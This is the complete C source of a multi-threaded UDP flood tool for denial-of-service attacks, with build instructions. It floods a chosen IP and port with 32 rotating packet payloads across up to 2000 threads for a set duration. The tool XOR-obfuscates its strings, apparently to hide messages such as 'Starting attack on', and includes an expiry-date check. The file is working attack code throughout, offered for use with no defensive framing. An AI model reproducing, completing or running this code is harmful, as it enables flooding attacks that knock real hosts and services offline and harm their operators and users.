/*
   UDP Flood Tool – segfault fixed, line breaks working, 32 payloads
   Build: gcc -pthread -O2 -Wall -Wextra -Wformat-security -o m m.c
*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <time.h>
#include <errno.h>

#define EXPIRY_YEAR  2025
#define EXPIRY_MONTH 12
#define EXPIRY_DAY   31
#define XOR_KEY      0x5A
#define MAX_THREADS  2000

#define ENCRYPT_CHAR(c) ((c) ^ XOR_KEY)

/*────────────────── encrypted messages ──────────────────*/
#define MSG_RULE_ENC {                                                      \
 ENCRYPT_CHAR('-'),ENCRYPT_CHAR('-'),ENCRYPT_CHAR('-'),ENCRYPT_CHAR('-'),   \
 ENCRYPT_CHAR('-'),ENCRYPT_CHAR('-'),ENCRYPT_CHAR('-'),ENCRYPT_CHAR('-'),   \
 ENCRYPT_CHAR('-'),ENCRYPT_CHAR('-'),ENCRYPT_CHAR('-'),ENCRYPT_CHAR('-'),   \
 ENCRYPT_CHAR('-'),ENCRYPT_CHAR('-'),ENCRYPT_CHAR('-'),ENCRYPT_CHAR('-'),   \
 ENCRYPT_CHAR('-'),ENCRYPT_CHAR('-'),ENCRYPT_CHAR('-'),ENCRYPT_CHAR('-'),   \
 ENCRYPT_CHAR('-'),ENCRYPT_CHAR('\n') }

#define MSG_USAGE_ENC {                                                     \
 ENCRYPT_CHAR('U'),ENCRYPT_CHAR('s'),ENCRYPT_CHAR('a'),ENCRYPT_CHAR('g'),   \
 ENCRYPT_CHAR('e'),ENCRYPT_CHAR(':'),ENCRYPT_CHAR(' '),ENCRYPT_CHAR('%'),   \
 ENCRYPT_CHAR('s'),ENCRYPT_CHAR(' '),ENCRYPT_CHAR('<'),ENCRYPT_CHAR('I'),   \
 ENCRYPT_CHAR('P'),ENCRYPT_CHAR('>'),ENCRYPT_CHAR(' '),ENCRYPT_CHAR('<'),   \
 ENCRYPT_CHAR('P'),ENCRYPT_CHAR('o'),ENCRYPT_CHAR('r'),ENCRYPT_CHAR('t'),   \
 ENCRYPT_CHAR('>'),ENCRYPT_CHAR(' '),ENCRYPT_CHAR('<'),ENCRYPT_CHAR('D'),   \
 ENCRYPT_CHAR('u'),ENCRYPT_CHAR('r'),ENCRYPT_CHAR('a'),ENCRYPT_CHAR('t'),   \
 ENCRYPT_CHAR('i'),ENCRYPT_CHAR('o'),ENCRYPT_CHAR('n'),ENCRYPT_CHAR('S'),   \
 ENCRYPT_CHAR('e'),ENCRYPT_CHAR('c'),ENCRYPT_CHAR('>'),ENCRYPT_CHAR(' '),   \
 ENCRYPT_CHAR('<'),ENCRYPT_CHAR('T'),ENCRYPT_CHAR('h'),ENCRYPT_CHAR('r'),   \
 ENCRYPT_CHAR('e'),ENCRYPT_CHAR('a'),ENCRYPT_CHAR('d'),ENCRYPT_CHAR('s'),   \
 ENCRYPT_CHAR('>'),ENCRYPT_CHAR('\n'),ENCRYPT_CHAR('\n'),                   \
 ENCRYPT_CHAR('E'),ENCRYPT_CHAR('x'),ENCRYPT_CHAR('a'),ENCRYPT_CHAR('m'),   \
 ENCRYPT_CHAR('p'),ENCRYPT_CHAR('l'),ENCRYPT_CHAR('e'),ENCRYPT_CHAR(':'),   \
 ENCRYPT_CHAR('\n'),ENCRYPT_CHAR('%'),ENCRYPT_CHAR('s'),ENCRYPT_CHAR(' '),  \
 ENCRYPT_CHAR('1'),ENCRYPT_CHAR('2'),ENCRYPT_CHAR('7'),ENCRYPT_CHAR('.'),   \
 ENCRYPT_CHAR('0'),ENCRYPT_CHAR('.'),ENCRYPT_CHAR('0'),ENCRYPT_CHAR('.'),   \
 ENCRYPT_CHAR('1'),ENCRYPT_CHAR(' '),ENCRYPT_CHAR('8'),ENCRYPT_CHAR('0'),   \
 ENCRYPT_CHAR(' '),ENCRYPT_CHAR('6'),ENCRYPT_CHAR('0'),ENCRYPT_CHAR(' '),   \
 ENCRYPT_CHAR('1'),ENCRYPT_CHAR('6'),ENCRYPT_CHAR('\n') }

#define MSG_EXPIRED_ENC {                                                   \
 ENCRYPT_CHAR('E'),ENCRYPT_CHAR('r'),ENCRYPT_CHAR('r'),ENCRYPT_CHAR('o'),   \
 ENCRYPT_CHAR('r'),ENCRYPT_CHAR(':'),ENCRYPT_CHAR(' '),ENCRYPT_CHAR('T'),   \
 ENCRYPT_CHAR('o'),ENCRYPT_CHAR('o'),ENCRYPT_CHAR('l'),ENCRYPT_CHAR(' '),   \
 ENCRYPT_CHAR('e'),ENCRYPT_CHAR('x'),ENCRYPT_CHAR('p'),ENCRYPT_CHAR('i'),   \
 ENCRYPT_CHAR('r'),ENCRYPT_CHAR('e'),ENCRYPT_CHAR('d'),ENCRYPT_CHAR(' '),   \
 ENCRYPT_CHAR('o'),ENCRYPT_CHAR('n'),ENCRYPT_CHAR(' '),                     \
 ENCRYPT_CHAR('%'),ENCRYPT_CHAR('0'),ENCRYPT_CHAR('4'),ENCRYPT_CHAR('d'),   \
 ENCRYPT_CHAR('-'),ENCRYPT_CHAR('%'),ENCRYPT_CHAR('0'),ENCRYPT_CHAR('2'),   \
 ENCRYPT_CHAR('d'),ENCRYPT_CHAR('-'),ENCRYPT_CHAR('%'),ENCRYPT_CHAR('0'),   \
 ENCRYPT_CHAR('2'),ENCRYPT_CHAR('d'),ENCRYPT_CHAR(' '),ENCRYPT_CHAR('U'),   \
 ENCRYPT_CHAR('T'),ENCRYPT_CHAR('C'),ENCRYPT_CHAR('.'),ENCRYPT_CHAR('\n') }

#define MSG_THREADS_ERR_ENC {                                               \
 ENCRYPT_CHAR('E'),ENCRYPT_CHAR('r'),ENCRYPT_CHAR('r'),ENCRYPT_CHAR('o'),   \
 ENCRYPT_CHAR('r'),ENCRYPT_CHAR(':'),ENCRYPT_CHAR(' '),ENCRYPT_CHAR('T'),   \
 ENCRYPT_CHAR('h'),ENCRYPT_CHAR('r'),ENCRYPT_CHAR('e'),ENCRYPT_CHAR('a'),   \
 ENCRYPT_CHAR('d'),ENCRYPT_CHAR('s'),ENCRYPT_CHAR(' '),ENCRYPT_CHAR('m'),   \
 ENCRYPT_CHAR('u'),ENCRYPT_CHAR('s'),ENCRYPT_CHAR('t'),ENCRYPT_CHAR(' '),   \
 ENCRYPT_CHAR('b'),ENCRYPT_CHAR('e'),ENCRYPT_CHAR(' '),ENCRYPT_CHAR('1'),   \
 ENCRYPT_CHAR('-'),ENCRYPT_CHAR('1'),ENCRYPT_CHAR('0'),ENCRYPT_CHAR('0'),   \
 ENCRYPT_CHAR('0'),ENCRYPT_CHAR('.'),ENCRYPT_CHAR('\n') }

#define MSG_SOCKET_ERR_ENC {                                                \
 ENCRYPT_CHAR('S'),ENCRYPT_CHAR('o'),ENCRYPT_CHAR('c'),ENCRYPT_CHAR('k'),   \
 ENCRYPT_CHAR('e'),ENCRYPT_CHAR('t'),ENCRYPT_CHAR(' '),ENCRYPT_CHAR('e'),   \
 ENCRYPT_CHAR('r'),ENCRYPT_CHAR('r'),ENCRYPT_CHAR('o'),ENCRYPT_CHAR('r'),   \
 ENCRYPT_CHAR(':'),ENCRYPT_CHAR(' '),ENCRYPT_CHAR('%'),ENCRYPT_CHAR('s'),   \
 ENCRYPT_CHAR('\n') }

#define MSG_INVALID_IP_ENC {                                                \
 ENCRYPT_CHAR('I'),ENCRYPT_CHAR('n'),ENCRYPT_CHAR('v'),ENCRYPT_CHAR('a'),   \
 ENCRYPT_CHAR('l'),ENCRYPT_CHAR('i'),ENCRYPT_CHAR('d'),ENCRYPT_CHAR(' '),   \
 ENCRYPT_CHAR('I'),ENCRYPT_CHAR('P'),ENCRYPT_CHAR(' '),ENCRYPT_CHAR('a'),   \
 ENCRYPT_CHAR('d'),ENCRYPT_CHAR('d'),ENCRYPT_CHAR('r'),ENCRYPT_CHAR('e'),   \
 ENCRYPT_CHAR('s'),ENCRYPT_CHAR('s'),ENCRYPT_CHAR(':'),ENCRYPT_CHAR(' '),   \
 ENCRYPT_CHAR('%'),ENCRYPT_CHAR('s'),ENCRYPT_CHAR('\n') }

#define MSG_START_ATTACK_ENC {                                              \
 ENCRYPT_CHAR('S'),ENCRYPT_CHAR('t'),ENCRYPT_CHAR('a'),ENCRYPT_CHAR('r'),   \
 ENCRYPT_CHAR('t'),ENCRYPT_CHAR('i'),ENCRYPT_CHAR('n'),ENCRYPT_CHAR('g'),   \
 ENCRYPT_CHAR(' '),ENCRYPT_CHAR('a'),ENCRYPT_CHAR('t'),ENCRYPT_CHAR('t'),   \
 ENCRYPT_CHAR('a'),ENCRYPT_CHAR('c'),ENCRYPT_CHAR('k'),ENCRYPT_CHAR(' '),   \
 ENCRYPT_CHAR('o'),ENCRYPT_CHAR('n'),ENCRYPT_CHAR(' '),ENCRYPT_CHAR('%'),   \
 ENCRYPT_CHAR('s'),ENCRYPT_CHAR(':'),ENCRYPT_CHAR('%'),ENCRYPT_CHAR('u'),   \
 ENCRYPT_CHAR(' '),ENCRYPT_CHAR('f'),ENCRYPT_CHAR('o'),ENCRYPT_CHAR('r'),   \
 ENCRYPT_CHAR(' '),ENCRYPT_CHAR('%'),ENCRYPT_CHAR('u'),ENCRYPT_CHAR(' '),   \
 ENCRYPT_CHAR('s'),ENCRYPT_CHAR('e'),ENCRYPT_CHAR('c'),ENCRYPT_CHAR('o'),   \
 ENCRYPT_CHAR('n'),ENCRYPT_CHAR('d'),ENCRYPT_CHAR('s'),ENCRYPT_CHAR(' '),   \
 ENCRYPT_CHAR('w'),ENCRYPT_CHAR('i'),ENCRYPT_CHAR('t'),ENCRYPT_CHAR('h'),   \
 ENCRYPT_CHAR(' '),ENCRYPT_CHAR('%'),ENCRYPT_CHAR('d'),ENCRYPT_CHAR(' '),   \
 ENCRYPT_CHAR('t'),ENCRYPT_CHAR('h'),ENCRYPT_CHAR('r'),ENCRYPT_CHAR('e'),   \
 ENCRYPT_CHAR('a'),ENCRYPT_CHAR('d'),ENCRYPT_CHAR('s'),ENCRYPT_CHAR('.'),   \
 ENCRYPT_CHAR('\n') }

#define MSG_THREAD_LAUNCHED_ENC {                                           \
 ENCRYPT_CHAR('T'),ENCRYPT_CHAR('h'),ENCRYPT_CHAR('r'),ENCRYPT_CHAR('e'),   \
 ENCRYPT_CHAR('a'),ENCRYPT_CHAR('d'),ENCRYPT_CHAR(' '),ENCRYPT_CHAR('l'),   \
 ENCRYPT_CHAR('a'),ENCRYPT_CHAR('u'),ENCRYPT_CHAR('n'),ENCRYPT_CHAR('c'),   \
 ENCRYPT_CHAR('h'),ENCRYPT_CHAR('e'),ENCRYPT_CHAR('d'),ENCRYPT_CHAR(':'),   \
 ENCRYPT_CHAR(' '),ENCRYPT_CHAR('I'),ENCRYPT_CHAR('D'),ENCRYPT_CHAR(' '),   \
 ENCRYPT_CHAR('#'),ENCRYPT_CHAR('%'),ENCRYPT_CHAR('l'),ENCRYPT_CHAR('u'),   \
 ENCRYPT_CHAR('\n') }

#define MSG_FINISHED_ENC {                                                  \
 ENCRYPT_CHAR('A'),ENCRYPT_CHAR('l'),ENCRYPT_CHAR('l'),ENCRYPT_CHAR(' '),   \
 ENCRYPT_CHAR('t'),ENCRYPT_CHAR('h'),ENCRYPT_CHAR('r'),ENCRYPT_CHAR('e'),   \
 ENCRYPT_CHAR('a'),ENCRYPT_CHAR('d'),ENCRYPT_CHAR('s'),ENCRYPT_CHAR(' '),   \
 ENCRYPT_CHAR('c'),ENCRYPT_CHAR('o'),ENCRYPT_CHAR('m'),ENCRYPT_CHAR('p'),   \
 ENCRYPT_CHAR('l'),ENCRYPT_CHAR('e'),ENCRYPT_CHAR('t'),ENCRYPT_CHAR('e'),   \
 ENCRYPT_CHAR('d'),ENCRYPT_CHAR('.'),ENCRYPT_CHAR(' '),ENCRYPT_CHAR('A'),   \
 ENCRYPT_CHAR('t'),ENCRYPT_CHAR('t'),ENCRYPT_CHAR('a'),ENCRYPT_CHAR('c'),   \
 ENCRYPT_CHAR('k'),ENCRYPT_CHAR(' '),ENCRYPT_CHAR('f'),ENCRYPT_CHAR('i'),   \
 ENCRYPT_CHAR('n'),ENCRYPT_CHAR('i'),ENCRYPT_CHAR('s'),ENCRYPT_CHAR('h'),   \
 ENCRYPT_CHAR('e'),ENCRYPT_CHAR('d'),ENCRYPT_CHAR('.'),ENCRYPT_CHAR('\n') }

#define MSG_STATS_SUM_ENC {                                                 \
 ENCRYPT_CHAR('T'),ENCRYPT_CHAR('o'),ENCRYPT_CHAR('t'),ENCRYPT_CHAR('a'),   \
 ENCRYPT_CHAR('l'),ENCRYPT_CHAR(' '),ENCRYPT_CHAR('p'),ENCRYPT_CHAR('a'),   \
 ENCRYPT_CHAR('c'),ENCRYPT_CHAR('k'),ENCRYPT_CHAR('e'),ENCRYPT_CHAR('t'),   \
 ENCRYPT_CHAR('s'),ENCRYPT_CHAR(' '),ENCRYPT_CHAR('s'),ENCRYPT_CHAR('e'),   \
 ENCRYPT_CHAR('n'),ENCRYPT_CHAR('t'),ENCRYPT_CHAR(':'),ENCRYPT_CHAR(' '),   \
 ENCRYPT_CHAR('%'),ENCRYPT_CHAR('l'),ENCRYPT_CHAR('u'),ENCRYPT_CHAR('\n') }

#define MSG_STATS_RATE_ENC {                                                \
 ENCRYPT_CHAR('A'),ENCRYPT_CHAR('v'),ENCRYPT_CHAR('e'),ENCRYPT_CHAR('r'),   \
 ENCRYPT_CHAR('a'),ENCRYPT_CHAR('g'),ENCRYPT_CHAR('e'),ENCRYPT_CHAR(' '),   \
 ENCRYPT_CHAR('r'),ENCRYPT_CHAR('a'),ENCRYPT_CHAR('t'),ENCRYPT_CHAR('e'),   \
 ENCRYPT_CHAR(':'),ENCRYPT_CHAR(' '),ENCRYPT_CHAR('%'),ENCRYPT_CHAR('.'),   \
 ENCRYPT_CHAR('2'),ENCRYPT_CHAR('f'),ENCRYPT_CHAR(' '),ENCRYPT_CHAR('p'),   \
 ENCRYPT_CHAR('k'),ENCRYPT_CHAR('t'),ENCRYPT_CHAR('/'),ENCRYPT_CHAR('s'),   \
 ENCRYPT_CHAR('\n') }

/*────────── decrypt helpers ─────────*/
static char *dec(const unsigned char *a,size_t n){
    char *s=malloc(n+1); if(!s) return NULL;
    for(size_t i=0;i<n;i++) s[i]=(char)(a[i]^XOR_KEY);
    s[n]='\0'; return s;
}
static void print_dec(FILE *f,const unsigned char *a,size_t n){
    char *s=dec(a,n); if(s){fprintf(f,"%s",s); free(s);}
}

/*────────── 32 payloads ─────────*/
static const unsigned char P1 [] ={0x83,0x5A};
static const unsigned char P2 [] ={0x5A,0x5A};
static const unsigned char P3 [] ={0x6E,0x36,0xF7,0xB5};
static const unsigned char P4 [] ={0x84,0xF7,0xE4,0xA5};
static const unsigned char P5 [] ={0xE0,0xA5,0xC7,0x3F,0x8D};
static const unsigned char P6 [] ={0x15,0x7E,0x2B,0x9C};
static const unsigned char P7 [] ={0x7E,0x36,0xF7,0xB5,0x5A};
static const unsigned char P8 [] ={0x2C,0x15,0x87,0xFC,0xF8};
static const unsigned char P9 [] ={0x63,0x30,0xF0,0xBB,0xE4};
static const unsigned char P10[]={0x4B,0xA6,0x1D,0x93,0xEA};
static const unsigned char P11[]={0x03,0x99,0x15,0x6A,0xB2,0x8C};
static const unsigned char P12[]={0xF1,0xBC,0x58,0xAE};
static const unsigned char P13[]={0x9E,0x37,0x48,0x19};
static const unsigned char P14[]={0xDD,0x7E,0x9A,0x5E,0x6B};
static const unsigned char P15[]={0x14,0xA9,0x3D,0x21,0xEF};
static const unsigned char P16[]={0x82,0x23,0x57,0x3D};
static const unsigned char P17[]={0xBC,0x2A,0xDE,0x1B,0xFF};
static const unsigned char P18[]={0x49,0x81,0x40,0x53,0x2D};
static const unsigned char P19[]={0x1F,0x68,0x9C,0xEA,0xA3};
static const unsigned char P20[]={0x08,0xB2,0x5D,0x3A,0x44};
static const unsigned char P21[]={0xC6,0x97,0xAB,0x14,0xBE};
static const unsigned char P22[]={0x6D,0x14,0x90,0xD9,0xAF};
static const unsigned char P23[]={0x34,0xF8,0x2E,0x7D,0x50};
static const unsigned char P24[]={0xA9,0x75,0x9E,0x23,0xC3};
static const unsigned char P25[]={0xE0,0x6A,0x1F,0x7B,0x6F};
static const unsigned char P26[]={0xFA,0xB8,0x27,0x54,0x9D};
static const unsigned char P27[]={0x33,0xC3,0x44,0x89,0x10};
static const unsigned char P28[]={0xD1,0x67,0xAC,0x39,0xB4};
static const unsigned char P29[]={0x47,0xAE,0xBB,0x03,0x57};
static const unsigned char P30[]={0x5C,0x9E,0x53,0x15,0x81};
static const unsigned char P31[]={0x8A,0x19,0x77,0x50,0xD7};
static const unsigned char P32[]={0x12,0x6B,0x91,0x28,0xE2};

struct enc_pl { const unsigned char *d; size_t n; } payloads[]={
  {P1 ,sizeof P1 },{P2 ,sizeof P2 },{P3 ,sizeof P3 },{P4 ,sizeof P4 },
  {P5 ,sizeof P5 },{P6 ,sizeof P6 },{P7 ,sizeof P7 },{P8 ,sizeof P8 },
  {P9 ,sizeof P9 },{P10,sizeof P10},{P11,sizeof P11},{P12,sizeof P12},
  {P13,sizeof P13},{P14,sizeof P14},{P15,sizeof P15},{P16,sizeof P16},
  {P17,sizeof P17},{P18,sizeof P18},{P19,sizeof P19},{P20,sizeof P20},
  {P21,sizeof P21},{P22,sizeof P22},{P23,sizeof P23},{P24,sizeof P24},
  {P25,sizeof P25},{P26,sizeof P26},{P27,sizeof P27},{P28,sizeof P28},
  {P29,sizeof P29},{P30,sizeof P30},{P31,sizeof P31},{P32,sizeof P32}
};
#define N_PAY (sizeof payloads/sizeof payloads[0])

/*────────── worker thread ─────────*/
struct arg{char ip[16];uint16_t port;unsigned dur;};
static pthread_mutex_t mx=PTHREAD_MUTEX_INITIALIZER;
static unsigned long total=0;

static void *worker(void *vp){
    struct arg *a=vp;
    int sd=socket(AF_INET,SOCK_DGRAM,0);
    if(sd<0){
        const unsigned char raw[]=MSG_SOCKET_ERR_ENC;
        char *d=dec(raw,sizeof raw);
        if(d){fprintf(stderr,d,strerror(errno)); free(d);} 
        free(a); return NULL;
    }
    struct sockaddr_in dst={.sin_family=AF_INET,.sin_port=htons(a->port)};
    if(inet_pton(AF_INET,a->ip,&dst.sin_addr)!=1){
        const unsigned char raw[]=MSG_INVALID_IP_ENC;
        char *d=dec(raw,sizeof raw);
        if(d){fprintf(stderr,d,a->ip); free(d);} 
        close(sd); free(a); return NULL;
    }

    unsigned char *buf[N_PAY]; size_t ln[N_PAY];
    for(size_t i=0;i<N_PAY;i++){ln[i]=payloads[i].n; buf[i]=malloc(ln[i]);
        for(size_t j=0;j<ln[i];j++) buf[i][j]=payloads[i].d[j]^XOR_KEY;}

    size_t idx=0,loc=0; time_t end=time(NULL)+a->dur;
    while(time(NULL)<=end){
        sendto(sd,buf[idx],ln[idx],0,(struct sockaddr*)&dst,sizeof dst);
        idx=(idx+1)%N_PAY; loc++;
    }
    for(size_t i=0;i<N_PAY;i++) free(buf[i]);
    close(sd); free(a);

    pthread_mutex_lock(&mx); total+=loc; pthread_mutex_unlock(&mx);
    return NULL;
}

/*────────── main ─────────*/
int main(int ac,char **av){
    /* opening rule line */
    { const unsigned char rule[]=MSG_RULE_ENC; print_dec(stdout,rule,sizeof rule); }

    /* expiry check */
    {
        struct tm t={0};
        t.tm_year=EXPIRY_YEAR-1900; t.tm_mon=EXPIRY_MONTH-1; t.tm_mday=EXPIRY_DAY;
        t.tm_hour=23; t.tm_min=59; t.tm_sec=59;
        if(time(NULL)>timegm(&t)){
            const unsigned char raw[]=MSG_EXPIRED_ENC;
            char *d=dec(raw,sizeof raw);
            if(d){fprintf(stderr,d,EXPIRY_YEAR,EXPIRY_MONTH,EXPIRY_DAY); free(d);}
            return 1;
        }
    }

    if(ac!=5){
        char *exe=strrchr(av[0],'/'); exe=exe?exe+1:av[0];
        const unsigned char raw[]=MSG_USAGE_ENC;
        char *d=dec(raw,sizeof raw);
        if(d){fprintf(stderr,d,exe,exe); free(d);}  /* ← FIXED: pass exe twice */
        { const unsigned char rule[]=MSG_RULE_ENC; print_dec(stdout,rule,sizeof rule); }
        return 1;
    }

    struct arg base;
    strncpy(base.ip,av[1],15); base.ip[15]='\0';
    base.port=(uint16_t)atoi(av[2]);
    base.dur=(unsigned)atoi(av[3]);
    int nth=atoi(av[4]);
    if(nth<1||nth>MAX_THREADS){
        const unsigned char raw[]=MSG_THREADS_ERR_ENC;
        print_dec(stderr,raw,sizeof raw); return 1;
    }

    { const unsigned char raw[]=MSG_START_ATTACK_ENC;
      char *d=dec(raw,sizeof raw);
      if(d){printf(d,base.ip,base.port,base.dur,nth); free(d);} }

    pthread_t tid[nth];
    for(int i=0;i<nth;i++){
        struct arg *a=malloc(sizeof *a); *a=base;
        if(pthread_create(&tid[i],NULL,worker,a)==0){
            const unsigned char raw[]=MSG_THREAD_LAUNCHED_ENC;
            char *d=dec(raw,sizeof raw);
            if(d){printf(d,(unsigned long)tid[i]); free(d);}
        }else free(a);
    }
    for(int i=0;i<nth;i++) pthread_join(tid[i],NULL);

    { const unsigned char raw[]=MSG_FINISHED_ENC; print_dec(stdout,raw,sizeof raw); }
    { const unsigned char s1[]=MSG_STATS_SUM_ENC, s2[]=MSG_STATS_RATE_ENC;
      char *p1=dec(s1,sizeof s1), *p2=dec(s2,sizeof s2);
      if(p1){printf(p1,total); free(p1);}
      if(p2){printf(p2,(double)total/base.dur); free(p2);} }

    { const unsigned char rule[]=MSG_RULE_ENC; print_dec(stdout,rule,sizeof rule); }
    return 0;
}
